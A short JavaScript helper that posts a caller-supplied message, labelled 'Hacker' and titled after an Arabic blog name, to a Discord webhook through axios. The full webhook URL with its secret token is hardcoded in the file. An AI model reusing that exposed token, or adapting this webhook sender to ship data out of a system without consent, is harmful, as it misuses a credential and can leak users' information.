import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة زاجل ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1367167404332814458/x_7PNYqDhfgIzLHThVgzM2CFQ-sEP53Eh_IDKBqFEXSVB3YrbLjLolE7oZQbkBOYogsS",body)
    }
  return {
    Send,
}
}

export default TeleSned;
